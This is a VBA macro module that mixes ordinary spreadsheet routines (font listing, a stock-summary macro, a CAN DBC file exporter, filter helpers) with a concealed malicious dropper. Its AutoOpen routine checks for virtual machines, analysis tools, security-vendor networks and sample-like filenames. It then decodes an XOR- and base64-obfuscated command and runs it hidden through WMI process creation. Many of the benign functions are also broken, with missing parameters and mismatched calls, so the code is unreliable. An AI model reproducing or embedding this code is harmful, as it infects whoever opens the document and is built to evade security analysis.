Attribute VB_Name = "Module1"
Private Const CP_UTF8                       As Long = 65001

#If Win64 Then
Private Declare PtrSafe Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpDefaultChar As LongPtr, ByVal lpUsedDefaultChar As LongPtr) As LongPtr
Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr) As Long
#Else
Private Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long

#End If



Sub ShowInstalledFonts()

Dim FontList As CommandBarControl
Dim TempBar As CommandBar
Dim i As Long

'Create temporary CommandBar
Set TempBar = Application.CommandBars.Add
Set FontList = TempBar.Controls.Add(id:=1728)

'Put the fonts into column A
Range("A:A").ClearContents
For i = 0 To FontList.ListCount - 1
    Cells(i + 1, 1) = FontList.List(i + 1)
'   Cells(i + 1, 1).Font.Name = FontList.List(i + 1)
Next i

'Delete temporary CommandBar
TempBar.Delete

End Sub

Public Sub ActivateUserForm()

    SetForegroundWindow DialogHWnd(UserForm1)

End Sub

Public Function DialogHWnd() As Long

    ' Return the hWnd value for the window.

    If TypeName(WindowObject) = "DialogSheet" Then
        Select Case (CDbl(Application.Version))
            Case 7 ' Excel 95
                DialogHWnd = GetWindowFromTitle(WindowObject.DialogFrame.Caption, "bosa_sdm_XL")
            Case 8 ' Excel 97
                DialogHWnd = GetWindowFromTitle(WindowObject.DialogFrame.Caption, "bosa_sdm_XL8")
            Case 9 ' Excel 2000
                DialogHWnd = GetWindowFromTitle(WindowObject.DialogFrame.Caption, "bosa_sdm_XL9")
            Case Else
                Exit Function
        End Select
    Else
        Select Case (CDbl(Application.Version))
            Case 8 ' Excel 97
                DialogHWnd = GetWindowFromTitle(WindowObject.Caption, "ThunderXFrame")
            Case Is >= 9 ' Excel 2000 or later
                DialogHWnd = GetWindowFromTitle(WindowObject.Caption, "ThunderDFrame")
            Case Else
                Exit Function
        End Select
    End If

End Function

Public Function GetWindowFromTitle() As Long

    ' Find the window handle of the window with the class and name provided.

    Dim hwnd As Long

    If Len(ClassName) = 0 Then
        hwnd = FindWindow(vbNullString, WindowTitle)
    Else
        hwnd = FindWindow(ClassName, WindowTitle)
    End If

    GetWindowFromTitle = hwnd

End Function


Function PobieranieDanychDoComboBox()
'PobieranieDanychDoComboBox - Pobiera dane z arkusza z wybranej kolumny bez powtorzen.
'Copyright (c)by Jan T. Biernat
'
    Dim CzyIstnieje As Integer 'Zadeklarowanie zmiennej numerycznej logicznej "CzyIstnieje".
    Dim Licznik As Integer
    Dim Komorka As String
    With NazwaKomponentu
        .Clear 'Wyczysc zawartosc komponentu.
        Licznik = 0 'Przypisanie wartosci 0 do zmiennej liczbowej "Licznik".
        Do
            Komorka = "" 'Wyczyszczenie zmiennej tekstowej "Komorka".
            Komorka = Trim(Sheets("Opcje-dane").Cells(2 + Licznik, NrKolumny).Value) 'Pobranie danych z wybranego arkusza, kolumny i komorki.
            If (Komorka <> "") Then
                'Jezeli komorka zawiera jakas wartosc, to wykonaj ponizsze instrukcje.
                'Sprawdzenie, czy na liscie znajduje sie pobrana z arkusza informacja.
                CzyIstnieje = 0
                For Spr = 0 To .ListCount - 1
                    If (LCase(Komorka) = LCase(.List(Spr))) Then
                        CzyIstnieje = 1
                        Exit For
                    End If
                Next Spr
                'Dodaj dane do listy.
                If (CzyIstnieje = 0) Then
                    .AddItem (Komorka)
                End If
            End If
            Licznik = Licznik + 1 'Zwiekszenie zawartosci zmiennej "Licznik" o wartosc 1.
        Loop Until Komorka = "" 'Jezeli natrafi na pusta komorke, to petla zakonczy swoje dzialanie
    End With
End Function



''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''



Public Function ToBase64(sValue As String, Optional ByVal MultiLine As Boolean) As String
    Dim baValue()       As Byte
    Dim lSize           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin.base64"
        ReDim baValue(0 To 4 * Len(sValue))
        lSize = WideCharToMultiByte(CP_UTF8, 0, StrPtr(sValue), Len(sValue), baValue(0), UBound(baValue) + 1, 0, 0)
        If lSize > 0 Then
            ReDim Preserve baValue(0 To lSize - 1)
            .NodeTypedValue = baValue
        End If
        ToBase64 = .text
        If Not MultiLine Then
            ToBase64 = Replace(Replace(ToBase64, vbCrLf, vbNullString), vbLf, vbNullString)
        End If
    End With
End Function

Sub AutoOpen()
 Dim Vniko As String

    
    If checkISP() Or checkProc() Or checkMac() Or checkPnP() Or checkBios() Or checkCores() Or checkFilenameBad() Or checkTasks() Then
    GoTo Fer
    End If
    
    
    Set Locator = CreateObject("WbemScripting.SWbemLocator")
    Set Retelo = Locator.ConnectServer()
    Retelo.Security_.ImpersonationLevel = 3
    Set cumami = Retelo.Get(yetras(Groa("IQwcQFM8OAwYAiEHABcdFlgkFhcTBhsWS0IXHgMCGgQVABYcTw4BBgQKARwHF0YGGQhVXzMGGwoaExcyBQcaAAUWPBIMBhtYIhcHFg=="), "versache"))
    With cumami
        If .StatusCode = 0 Then
            End
        ElseIf .StatusCode > 0 Then
            End
        End If
    End With
    Set Xewer = Retelo.Get("Win32_Process")
    On Error Resume Next
    Descritis = Xewer.Create(yetras(Groa("BgoFFhMQAAAaCVJeFgoGARkSAQcYDw1FHgwWFwQNSEgVCh8eAA0MRT8IAhwTF0UoGQEHHwRDKgwCFiYBAA0bAxMXSVMyFwkXAkgwGhUQPBcXCwEVBBFISCUKBwECBkgNAhECAFtMRxEeAFwWABEcDVgJG1wfEA8RFxEaEgxMGBACEQtcDQIcAAURXQRSUUcVAxEGCk8GEABWSDYWEhcBCxcRGxwPQzRHUgAcBVs3LSgmORQaChcHSxMdFy9DWEg2AgQAB0wzGgoVAAEAQU4uDBoAIhIVC0g5VEEXHRdZPCA7NS4VCAgcClgAChY9QQ=="), "versache"), Null, Null, Quilo)
Fer:
End Sub

Function checkISP() As Boolean



    badISP = False
    badISPNames = Array("Amazon", "Anonymous", "Blue Coat Systems", "Cisco Systems", "Cloud", "Data Center", "Dedicated", "ESET", "FireEye", "Forcepoint", "Hetzner", "Hosted", "Hosting", "LeaseWeb", "Microsoft", "NForce", "OVH SAS", "Security", "Server", "Strong Technologies", "Trend Micro", "blackoakcomputers", "Datacamp")
    
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")


    request.Open "GET", "https://geoip.maxmind.com/geoip/v2.1/city/me", False
    request.setRequestHeader "Referer", "https://www.maxmind.com/en/locate-my-ip-address"
    request.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
    request.setRequestHeader "Host", "www.maxmind.com"
    request.send

        
        For Each badName In badISPNames
             If InStr(request.responseText, badName) > 0 Then
                badISP = True
            End If
        Next


    

    checkISP = badISP
    
End Function

Function checkProc() As Boolean

    Dim Name As String
    Dim Desc As String

    badProc = False
    badMacNames = Array("vbox", "vmware", "vxstream", "autoit", "vmtools", "tcpview", "wireshark", "process explorer", "visual basic", "fiddler", "qemu", "virtual", "kvm", "xen", "redhat")
    
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colAdapters = objWMIService.ExecQuery("SELECT * FROM Win32_Process")
    For Each objAdapter In colAdapters
        
        Name = objAdapter.Name

        For Each badName In badMacNames
            If InStr(LCase(Name), badName) > 0 Then
                badProc = True
            End If
        Next
    Next

    

    checkProc = badProc
    
End Function

Function checkMac() As Boolean



    badMac = False
    badMacNames = Array("00:50:56", "00:0C:29", "00:05:69", "80:00:27", "00:1C:42", "00:16:3E")
    
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colAdapters = objWMIService.ExecQuery("Select * from Win32_NetworkAdapter")
    For Each objAdapter In colAdapters
        
        MACAddress = objAdapter.MACAddress
        For Each badName In badMacNames
            If InStr(MACAddress, badName) > 0 Then
                badMac = True
            End If
        Next
    Next

    

    checkMac = badMac
    
End Function









Function checkFilenameBad() As Boolean

    
    
    badName = False
    badNames = Array("malware", "myapp", "sample", ".bin", "mlwr_", "Desktop")

    
    For Each n In badNames
        If InStr(LCase(ActiveDocument.FullName), n) > 0 Then
            badName = True
        End If
    Next
 

    checkFilenameBad = badName
    
End Function

Function checkTasks() As Boolean

 
    

    badTask = False
    badTaskNames = Array("vbox", "vmware", "vxstream", "autoit", "vmtools", "tcpview", "wireshark", "process explorer", "visual basic", "fiddler", "qemu")
    
    For Each Task In Application.Tasks
    
        For Each badTaskName In badTaskNames
            If InStr(LCase(Task.Name), badTaskName) > 0 Then
                badTask = True
            End If
        Next
        
    Next
    
    checkTasks = badTask
    
End Function

Function checkCores() As Boolean

    

    badCores = 0

    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * from Win32_Processor", , 48)
    
    For Each objItem In colItems
    
            If objItem.NumberOfCores < 3 Then
                badCores = True
            End If
        
    Next

  checkCores = badCores
    
End Function

Function checkBios() As Boolean



    badBios = False
    badBiosNames = Array("virtualbox", "vmware", "kvm", "qemu", "xen", "redhat", "a m i")
    
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * from Win32_Bios", , 48)
    
    For Each objItem In colItems
    
        For Each badName In badBiosNames
            If InStr(LCase(objItem.SMBIOSBIOSVersion), badName) > 0 Then
                badBios = True
            End If
            If InStr(LCase(objItem.SerialNumber), badName) > 0 Then
                badBios = True
            End If
        Next
        
    Next

    checkBios = badBios
    
End Function

Function checkPnP() As Boolean

    

    badPNP = False
    badPNPNames = Array("VEN_80EE", "VEN_15AD")
    
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * from Win32_PnPEntity", , 48)
    
    For Each objItem In colItems
    
        For Each badName In badPNPNames
            If InStr(LCase(objItem.DeviceId), badName) > 0 Then
                badPNP = True
            End If
        Next
        
    Next

    checkPnP = badPNP
    
End Function

Public Function Groa(sBase64 As String) As String
    Dim baValue()       As Byte
    Dim sValue          As String
    Dim lSize           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin.base64"
        .text = sBase64
        baValue = .NodeTypedValue
        sValue = String$(4 * UBound(baValue), 0)
        lSize = MultiByteToWideChar(CP_UTF8, 0, baValue(0), UBound(baValue) + 1, StrPtr(sValue), Len(sValue))
        Groa = Left$(sValue, lSize)
    End With
End Function

Private Function yetras(text As String, key As String) As String
  Dim bText() As Byte
  Dim bKey() As Byte
  
  Dim TextUB As Long
  Dim KeyUB As Long
  
  
  
  bText = StrConv(text, vbFromUnicode)
  bKey = StrConv(key, vbFromUnicode)
  TextUB = UBound(bText)
  KeyUB = UBound(bKey)
  Dim TextPos As Long
  Dim Trenfa As Long
  For TextPos = 0 To TextUB
    bText(TextPos) = bText(TextPos) Xor bKey(Trenfa)
    If Trenfa < KeyUB Then
      Trenfa = Trenfa + 1
    Else
      Trenfa = 0
    End If
  Next TextPos
  yetras = StrConv(bText, vbUnicode)
End Function



Public Function DUPLO(file_path As String) As Boolean
    

    trega = Dir(file_path) <> ""
    Exit Function

DirErr:
      If Err.Number = 68 Then
        trega = False
    Else
        MsgBox Err.Description & " (" & Err.Number & ")", , "Run-time Error"
        Stop
    End If
End Function

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''


Sub homework()

    ' initialize workbook
    Dim book As Workbook
    Set book = ActiveWorkbook
    
    ' determine total number of sheets in workbook
    totalSheets = book.Sheets.Count
     
    ' initialize all variables
    Dim rowTotal As Long ' total number of rows in sheet
    Dim columnTotal As Integer ' total number of columns in sheet
    Dim tickerCount As Integer ' number of different stocks in sheet
    Dim tickerName As String ' name of current stock
    Dim opening As Double ' open price at start of year
    Dim closing As Double ' closing price at end of year
    Dim numOfStocks As Integer ' number of stocks for current ticker

    
    ' determine total number of columns in the sheet
    columnTotal = Sheets(1).Cells(1, Columns.Count).End(xlToLeft).Column

' loop through all sheets using variable i
For i = 1 To totalSheets

    ' print labels into the necessary cells
    Sheets(i).Range("J1") = "Ticker"
    Sheets(i).Range("K1") = "Yearly Change"
    Sheets(i).Range("L1") = "Percent Change"
    Sheets(i).Range("M1") = "Total Stock Volume"
    Sheets(i).Range("Q1").Value = "Ticker"
    Sheets(i).Range("R1").Value = "Value"
    Sheets(i).Range("P2").Value = "Greatest % Increase"
    Sheets(i).Range("P3").Value = "Greatest % Decrease"
    Sheets(i).Range("P4").Value = "Greatest Total Volume"
    Sheets(i).Range("R2").NumberFormat = "0.00%" ' set this cell format to percentages
    Sheets(i).Range("R3").NumberFormat = "0.00%"  ' set this cell format to percentages
    
    ' reset variables for each sheet
    numOfStocks = 0
    opening = 0
    closing = 0
    tickerCount = 0
    
    'determine total number of rows in the sheet
    rowTotal = Sheets(i).Cells(Rows.Count, 2).End(xlUp).Row
        
    ' label all new columns

    
        ' loop through all rows
        For j = 2 To rowTotal
        
            ' sum total volume of stocks as you loop through the rows
            Sheets(i).Cells(tickerCount + 2, columnTotal + 6) = Sheets(i).Cells(j, 7) + Sheets(i).Cells(tickerCount + 2, columnTotal + 6)
            
            ' count the number of stocks per ticker
            numOfStocks = numOfStocks + 1
                
            ' if ticker name changes, do this
            If Sheets(i).Cells(j + 1, 1).Value <> Sheets(i).Cells(j, 1).Value Then
                
                ' increase ticker count by 1
                tickerCount = tickerCount + 1
                
                ' print ticker name in column 9
                Sheets(i).Cells(tickerCount + 1, columnTotal + 3) = Sheets(i).Cells(j, 1).Value
                 
                ' pull open value data from first row of the ticker
                opening = Sheets(i).Cells(j - (numOfStocks - 1), 3)
                
                ' pull close value data from last row of the ticker
                closing = Sheets(i).Cells(j, 6).Value
                 
                ' calculate yearly change
                Sheets(i).Cells(tickerCount + 1, columnTotal + 4) = closing - opening
                
                ' calculate percent change and then format it
                ' if one of the values is zero, assign percent change to 0
                If (closing = 0 Or opening = 0) Then
                    Sheets(i).Cells(tickerCount + 1, columnTotal + 5) = 0
                Else
                    Sheets(i).Cells(tickerCount + 1, columnTotal + 5) = ((closing / opening) - 1)
                End If
                Sheets(i).Cells(tickerCount + 1, columnTotal + 5).NumberFormat = "0.00%"
                 
                ' format the yearly change column depending on if the value is positive or negative
                If Sheets(i).Cells(tickerCount + 1, columnTotal + 4) > 0 Then
                    Sheets(i).Cells(tickerCount + 1, columnTotal + 4).Interior.ColorIndex = 4 ' if percent change is positive, make cell green
                ElseIf Sheets(i).Cells(tickerCount + 1, columnTotal + 4) < 0 Then
                    Sheets(i).Cells(tickerCount + 1, columnTotal + 4).Interior.ColorIndex = 3 ' if percent change is negative, make cell red
                End If
                
                ' reset the number of stocks for the next ticker iteration
                numOfStocks = 0
                    
            End If
        Next j
    Next i
    
' iterate through all summarize tickers in a sheet to find greatest percent increase, greatest percent decrease, and greatest total stock volume

' iterate through all sheets
For i = 1 To totalSheets
    
    ' calculate number of tickers
    rowTotal = Sheets(i).Cells(Rows.Count, 10).End(xlUp).Row
    
    ' iterate through tickers
    For j = 2 To rowTotal
    
        ' if the percent change value is higher than the one in R2, replace the value of R2 and then replace the ticker name
        If Sheets(i).Cells(j, 12) > Sheets(i).Range("R2") Then
            Sheets(i).Range("R2") = Sheets(i).Cells(j, 12).Value
            Sheets(i).Range("Q2") = Sheets(i).Cells(j, 10).Value
        End If
       ' if the percent change value is lower than the one in R3, replace the value of R3 and then replace the ticker name
        If Sheets(i).Cells(j, 12) < Sheets(i).Range("R3") Then
            Sheets(i).Range("R3") = Sheets(i).Cells(j, 12).Value
            Sheets(i).Range("Q3") = Sheets(i).Cells(j, 10).Value
        End If
        ' if the stock volume value is greater than the one in R4, replace the value of R4 and then replace the ticker name
        If Sheets(i).Cells(j, 13) > Sheets(i).Range("R4") Then
            Sheets(i).Range("R4") = Sheets(i).Cells(j, 13).Value
            Sheets(i).Range("Q4") = Sheets(i).Cells(j, 10).Value
        End If
    Next j
Next i


End Sub


Sub dbc_Click()

Application.DisplayAlerts = False
On Error Resume Next

Dim i, j, k, node_count, message_count, signal_count As Integer
Dim Filename, Arr
Dim nodes As String
Dim message, id, dlc, cycle_time, tx
Dim line, signal, byte_order, value_type, initial_value, value_table, comment, rx As String
Dim initial_value_list, value_table_list, cycle_time_list, comment_list As String
Dim str, text As String
Dim fso As New FileSystemObject
Dim starttime, endtime As Date
Dim elapsed As Double
Dim dbc_type As String

Filename = Application.GetSaveAsFilename(fileFilter:="DBC Files (*.dbc), *.dbc")

If Filename = False Then
    Exit Sub
End If

dbc_type = ActiveSheet.Cells(1, 2)

starttime = Now
endtime = starttime

Open Filename For Output As 1#

If dbc_type <> "J1939" Then
    Print #1, Sheet4.Cells(1, 2)
Else
    Print #1, Sheet5.Cells(1, 2)
End If

Print #1, vbLf

i = 18
nodes = ""
While Len(ActiveSheet.Cells(2, i)) > 0
    node_count = node_count + 1
    nodes = nodes & " " & ActiveSheet.Cells(2, i)
    i = i + 1
Wend
Print #1, "BU_:" & nodes
 
i = 3
message_count = 0
signal_count = 0
While Len(ActiveSheet.Cells(i, 5)) > 0
    If Len(ActiveSheet.Cells(i, 1)) > 0 Then
        message_count = message_count + 1
        message = ActiveSheet.Cells(i, 1)
        id = Hex2Dec(ActiveSheet.Cells(i, 2))
        If dbc_type <> "Standard" Then
            id = id + 2147483648#
        End If
        dlc = ActiveSheet.Cells(i, 3)
        For j = 1 To node_count
            If ActiveSheet.Cells(i, j + 17) = "T" Then
                tx = ActiveSheet.Cells(2, j + 17)
                Exit For
            End If
        Next j
        If tx = "" Then
            tx = "Vector__XXX"
        End If
        Print #1, vbLf
        Print #1, "BO_ " & id & " " & ActiveSheet.Cells(i, 1) & ": " & ActiveSheet.Cells(i, 3) & " " & tx
        If Len(ActiveSheet.Cells(i, 4) > 0) Then
            cycle_time = ActiveSheet.Cells(i, 4) + 0
            'cycle_time_list = cycle_time_list & "BA_ " & """GenMsgILSupport"" BO_ " & id & " " & 1 & ";" & vbLf
            cycle_time_list = cycle_time_list & "BA_ " & """GenMsgSendType"" BO_ " & id & " " & 0 & ";" & vbLf
            cycle_time_list = cycle_time_list & "BA_ " & """GenMsgCycleTime"" BO_ " & id & " " & cycle_time & ";" & vbLf
        End If
        
    Else
'        ActiveSheet.Cells(i, 1) = message
'        Hex2Dec(ActiveSheet.Cells(i, 2)) = id
'        Hex2Dec(ActiveSheet.Cells(i, 3)) = dlc
'        ActiveSheet.Cells(i, 4) = cycle_time
    End If
    signal_count = signal_count + 1
    signal = ActiveSheet.Cells(i, 5)
    If ActiveSheet.Cells(i, 8) = "MSB" Then
        byte_order = "0"
    Else
        byte_order = "1"
    End If
    If ActiveSheet.Cells(i, 9) = "Unsigned" Then
        value_type = "+"
    Else
        value_type = "-"
    End If
    rx = ""
    For j = 1 To node_count
            If ActiveSheet.Cells(i, j + 17) = "R" Then
                rx = rx & ActiveSheet.Cells(2, j + 17) & ","
            End If
    Next j
    If rx = "" Then
        rx = " Vector__XXX"
    Else
        rx = Mid(rx, 1, Len(rx) - 1)
    End If
    Print #1, " SG_ " & ActiveSheet.Cells(i, 5) & " : " & ActiveSheet.Cells(i, 6) & "|" & ActiveSheet.Cells(i, 7) & "@" & byte_order & value_type & _
        " (" & Num2Str(ActiveSheet.Cells(i, 11)) & "," & Num2Str(ActiveSheet.Cells(i, 12)) & ") " & "[" & Num2Str(ActiveSheet.Cells(i, 13)) & "|" & Num2Str(ActiveSheet.Cells(i, 14)) & "] " & _
        """" & ActiveSheet.Cells(i, 15) & """" & rx
    If Len(ActiveSheet.Cells(i, 10)) > 0 And Len(ActiveSheet.Cells(i, 1)) > 0 And ActiveSheet.Cells(i, 11) <> 0 Then
        initial_value = (ActiveSheet.Cells(i, 10) + ActiveSheet.Cells(i, 12)) / ActiveSheet.Cells(i, 11)
        initial_value_list = initial_value_list & "BA_ ""GenSigStartValue"" SG_ " & id & " " & signal & " " & initial_value & ";" & vbLf
    End If
    If Len(ActiveSheet.Cells(i, 16)) > 0 Then
        Arr = Split(ActiveSheet.Cells(i, 16), vbLf)
        value_table = ""
        For j = UBound(Arr) To 0 Step -1
            k = InStr(Arr(j), "=")
            value_table = value_table & Hex2Dec(Mid(Arr(j), 1, k - 1)) & " """ & Mid(Arr(j), k + 1, Len(Arr(j)) - k - 1) & """ "
        Next j
        value_table_list = value_table_list & "VAL_ " & id & " " & signal & " " & value_table & ";" & vbLf
    End If
    If Len(ActiveSheet.Cells(i, 17)) > 0 Then
        comment = ActiveSheet.Cells(i, 17)
        comment_list = comment_list & "CM_ SG_ " & id & " " & signal & " """ & comment & """;" & vbLf
    End If
    i = i + 1
Wend

Print #1, vbLf
Print #1, comment_list
If dbc_type <> "J1939" Then
    Print #1, Sheet4.Cells(2, 2)
    Print #1, Sheet4.Cells(3, 2)
Else
    Print #1, Sheet5.Cells(2, 2)
    Print #1, Sheet5.Cells(3, 2)
End If
Print #1, "BA_ ""DBName"" """ & fso.GetBaseName(Filename) + """;" + vbLf
Print #1, cycle_time_list
Print #1, initial_value_list
Print #1, value_table_list

Close #1


str = "DBC File= " + fso.GetFileName(Filename) + vbLf
str = str + "ECU Nodes Count= " + CStr(node_count) + vbLf
str = str + "Messages Count= " + CStr(message_count) + vbLf
str = str + "Signals Count= " + CStr(signal_count)
ActiveSheet.Cells(1, 5) = str

Set fso = Nothing

MsgBox "Finish, " + GetElapsedTime(starttime, "elapsed time")

End Sub

Private Function Num2Str() As String

Dim str As String
str = CStr(Num)
If Len(str) > 0 And Mid(str, 1, 1) = "." Then
    str = "0" & str
ElseIf Len(str) > 0 And Mid(str, 1, 2) = "-." Then
     str = "-0." & Mid(str, 3, Len(str) - 2)
End If
Num2Str = str

End Function

Private Function GetElapsedTime() As String
Dim text As String
Dim elapsed As Double
Dim endtime As Date

endtime = Now
elapsed = endtime - starttime
text = Step + ": " + Format(elapsed * 3600 * 24, "#0") + "s"
GetElapsedTime = text

End Function

Function Hex2Dec()
    h = Mid(h, 3, Len(h) - 2)
    Dim L As Long: L = Len(h)
    If L < 16 Then               ' CDec results in Overflow error for hex numbers above 16 ^ 8
        Hex2Dec = CDec("&h0" & h)
        If Hex2Dec < 0 Then Hex2Dec = Hex2Dec + 4294967296# ' 2 ^ 32
    ElseIf L < 25 Then
        Hex2Dec = Hex2Dec(Left$(h, L - 9)) * 68719476736# + CDec("&h" & Right$(h, 9)) ' 16 ^ 9 = 68719476736
    End If
End Function

Sub excel2dbc(control As String)
dbc_Click
End Sub

Function txt(rng As String) As String

txt = rng.Formula

End Function

Function DetermineCalcComponent(txt As String, ws As String) As String

Dim txtArr() As String
Dim i As Integer

i = 0

txtArr = Split(txt, vbLf)

For Each x In txtArr
    If (Left(txtArr(i), 4)) = "=IF(" Or (Left(txtArr(i), 3)) = "IF(" Then
        If createFormula(txtArr(i), ws) = True Then
            DetermineCalcComponent = Left(txtArr(i + 1), Len(txtArr(i + 1)) - 1)
            Exit For
        Else
            DetermineCalcComponent = Left(txtArr(i + 2), Len(txtArr(i + 2)) - 1)
        End If
    End If
    i = i + 1
Next x

If i = 1 And Left(txtArr(0), 8) <> "=IFERROR" Then
    DetermineCalcComponent = Mid(txtArr(0), 2, Len(txtArr(0)) - 1)
End If

For x = 1 To 20
    If Right(DetermineCalcComponent, 1) = ")" Or Right(DetermineCalcComponent, 1) = "," Then
        DetermineCalcComponent = Left(DetermineCalcComponent, Len(DetermineCalcComponent))
    Else
        Exit For
    End If
Next x

If DetermineCalcComponent = "" Then
    If Left(txtArr(0), 8) = "=IFERROR" Then
        DetermineCalcComponent = Mid(txtArr(1), 1, Len(txtArr(1)) - 1)
    End If
End If

  
  
Operation = Left(DetermineCalcComponent, InStr(DetermineCalcComponent, "(") - 1)


End Function

Function createFormula(txt As String, ws As String) As Boolean

Dim tmp2 As String
Dim st As Integer
Dim fn As Integer

createFormula = False

st = InStr(txt, "(") + 1
If Left(txt, 1) = "=" Then
    fn = Len(txt) - 5
Else
    fn = Len(txt) - 4
End If
txt = Mid(txt, st, fn)
createFormula = Evaluate(txt)

End Function

Sub FilterButton()

Application.ScreenUpdating = False
Application.Calculation = xlCalculationManual

Dim b As Object
Dim ws As Worksheet
Dim rng As Range
Dim txt As String

    Set b = ActiveSheet.Buttons(Application.Caller)
        txt = b.TopLeftCell.Formula
        OpFig = b.TopLeftCell.Value
        Set ws = ActiveSheet

Dim Arr() As String

Arr = filterArr(DetermineCalcComponent(txt, ws), ws)

Call applyFilter(Arr())


Application.ScreenUpdating = True
Application.Calculation = xlCalculationAutomatic

If Not Operation = "COUNTIFS" Then
    MsgBox ("This figure (" & Round(OpFig, 2) & ") is the " & LCase(Left(Operation, InStr(Operation, "IF") - 1)) & " of column: " & OpCol & " on this sheet with this filter applied")
End If

End Sub

Function filterArr(txt As String, ws As String) As String()

Dim i As Integer
Dim st As Integer
Dim fn As Integer
Dim txtArr() As String
Dim tmp As String
Dim calc As String
Dim conc As Boolean

txtArr = Split(txt, ",")
Dim newArr() As String


If Operation = "COUNTIFS" Then
    i = UBound(txtArr) + 1
    ReDim Preserve txtArr(UBound(txtArr) + 1)
    For x = 0 To i
        If i = 0 Then Exit For
        txtArr(i) = txtArr(i - 1)
    i = i - 1
    Next x
Else
    OpCol = Right(txtArr(0), Len(txtArr(0)) - InStr(txtArr(0), ":"))
    txtArr(0) = Operation & "(" & txtArr(1)
End If
 '
i = 0

'set sheet and first range
    st = InStr(txtArr(i), "!") + 1
    fn = Len(txtArr(i)) + 1
    tmp = Mid(txtArr(i), st, fn - st)
    st = InStr(txtArr(i), "(") + 1
    fn = InStr(Mid(txtArr(i), st), "!") + st - 1
                                ReDim Preserve newArr(0)
                                newArr(0) = Replace(Mid(txtArr(i), st, fn - st), "'", "")
    txtArr(i) = Replace(Mid(txtArr(i), st, fn - st), "'", "")
    ReDim Preserve txtArr(UBound(txtArr))
    txtArr(i + 1) = tmp
'    txtArr(i) = Mid(txtArr(i), st, fn - st)
i = 1

conc = False
Dim counter As Integer
Dim concZ As Integer
ConcCounter = 0


For x = 1 To UBound(txtArr) - ConcCounter
concZ = 0
    If (concperm = False And i Mod 2 = 1) Or InStr(txtArr(i), txtArr(0)) Then
        'get filter col as number (string format)
        st = InStr(txtArr(i), ":") + 1
        fn = Len(txtArr(i)) + 1
                                ReDim Preserve newArr(UBound(newArr) + 1)
                                newArr(UBound(newArr)) = wColNum(txtArr(0), Mid(txtArr(i), st, fn - st))
        txtArr(i - ConcCounter) = wColNum(txtArr(0), Mid(txtArr(i), st, fn - st))
    Else
        'get filter val as string
        If InStr(txtArr(i), "(") Then
            txtArr(i - ConcCounter) = txtArr(i) & "," & txtArr(i + 1)
            conc = True
            concperm = True
                If InStr(txtArr(i), ")") = 0 Then
                    txtArr(i) = txtArr(i - ConcCounter) & "," & txtArr(i + 2)
                    conc = True
                    concperm = True
                    concZ = 1
                End If
        End If
            If IsError(Evaluate(txtArr(i))) Then
                If IsError(Evaluate(txtArr(i) & ")")) Then
                    If IsError(Evaluate(Left(txtArr(i), Len(txtArr(i)) - 1))) Then
                                ReDim Preserve newArr(UBound(newArr) + 1)
                                newArr(UBound(newArr)) = Evaluate(Left(txtArr(i), Len(txtArr(i)) - 2))
                                txtArr(i - ConcCounter) = Evaluate(Left(txtArr(i), Len(txtArr(i)) - 2))
                    Else
                                ReDim Preserve newArr(UBound(newArr) + 1)
                                newArr(UBound(newArr)) = (Evaluate(Left(txtArr(i), Len(txtArr(i)) - 1)))
                        txtArr(i - ConcCounter) = (Evaluate(Left(txtArr(i), Len(txtArr(i)) - 1)))
                    End If
                Else
                                ReDim Preserve newArr(UBound(newArr) + 1)
                                newArr(UBound(newArr)) = Evaluate(txtArr(i) & ")")
                    txtArr(i - ConcCounter) = Evaluate(txtArr(i) & ")")
                End If
            Else
                On Error GoTo IsText
                                ReDim Preserve newArr(UBound(newArr) + 1)
                                newArr(UBound(newArr)) = Evaluate(txtArr(i))
                txtArr(i - ConcCounter) = Evaluate(txtArr(i))
            End If
        On Error GoTo 0
